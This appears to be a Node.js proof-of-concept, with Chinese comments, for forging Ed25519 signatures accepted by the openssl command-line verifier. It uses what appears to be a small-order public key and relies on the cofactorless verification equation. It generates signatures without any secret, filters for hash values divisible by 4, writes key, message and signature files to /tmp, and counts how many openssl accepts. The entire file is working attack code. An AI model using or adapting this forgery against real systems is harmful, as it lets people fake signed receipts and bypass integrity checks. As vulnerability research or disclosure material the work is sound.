// openssl CLI 单点根因：无小阶检查 + cofactorless 方程，k≡0 mod 4 时退化通过
import { ed25519 } from '@noble/curves/ed25519.js';
import { createHash, verify as nodeVerify, createPublicKey } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
const l = ed25519.Point.CURVE().n;
const A = Buffer.from('c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac03fa','hex');
const A2= Buffer.from('c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac037a','hex');
const M = Buffer.from('arbitrary receipt forged without any secret');
const kOf=(R,Am)=>{const h=createHash('sha512').update(Buffer.concat([R,Am,M])).digest();
  let k=0n;for(let i=63;i>=0;i--)k=(k<<8n)|BigInt(h[i]);return k%l};
console.log('k(…03fa) mod 4 =', kOf(ed25519.Point.BASE.multiply((2n**250n + 1234567890123456789n)%l).toBytes(),A)%4n, '(=0 → CLI接受)');
console.log('k(…037a) mod 4 =', kOf(ed25519.Point.BASE.multiply((2n**250n + 1234567890123456789n)%l).toBytes(),A2)%4n, '(≠0 → 拒)');
fs.writeFileSync('/tmp/c7.spki', Buffer.concat([Buffer.from('302a300506032b6570032100','hex'),A]));
fs.writeFileSync('/tmp/c7.msg', M);
let acc=0, tested=0;
for(let i=0;i<40;i++){
  const Si=(2n**200n+BigInt(i)*7919n)%l;
  const Ri=ed25519.Point.BASE.multiply(Si).toBytes();
  if(kOf(Ri,A)%4n!==0n) continue;
  tested++;
  const Sb=Buffer.alloc(32);{let s=Si;for(let j=0;j<32;j++){Sb[j]=Number(s&0xffn);s>>=8n}}
  fs.writeFileSync('/tmp/c7.sig',Buffer.concat([Ri,Sb]));
  try{execFileSync('openssl',['pkeyutl','-verify','-pubin','-inkey','/tmp/c7.spki','-keyform','DER','-rawin','-in','/tmp/c7.msg','-sigfile','/tmp/c7.sig'],{stdio:'pipe'});acc++}catch{}
}
console.log(`CLI 对 k≡0 mod 4 候选: ${acc}/${tested} 接受（攻击者期望约 4~6 次尝试必中）`);
